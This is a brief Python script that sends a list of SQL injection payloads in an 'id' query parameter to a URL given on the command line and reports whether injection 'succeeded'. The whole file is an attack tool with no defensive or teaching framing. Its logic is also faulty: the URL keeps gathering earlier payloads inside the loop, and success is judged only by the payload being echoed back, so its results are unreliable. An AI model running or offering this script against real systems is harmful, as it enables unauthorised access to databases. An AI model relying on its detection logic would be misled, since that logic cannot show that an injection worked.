#!/bin/python3

import sys
import requests

payloads = [
    "1' OR '1",
    "' OR '1",
    "' OR 1 -- -",
    '" OR "" = "',
    '" OR 1 = 1 -- -',
    "' OR '' = '",
    "'='",
    "'LIKE'",
    "'=0--+",
    "OR 1=1"
]

def sqlInjection(url):
    sqli = False
    for payload in payloads:
        url += f"?id={payload}&Submit=Submit#"
        
        try:
            httpResponse = requests.post(url)
        except:
            sys.exit(-1)

        if payload in httpResponse.text:
            print("SQL injection is successed")
            sqli = True
    
    if not sqli:
        print("SQL injection isn't succedd") 


# main function
# sys.argv[1] - host ip address
if __name__ == "__main__":
    url = sys.argv[1]
    sqlInjection(url)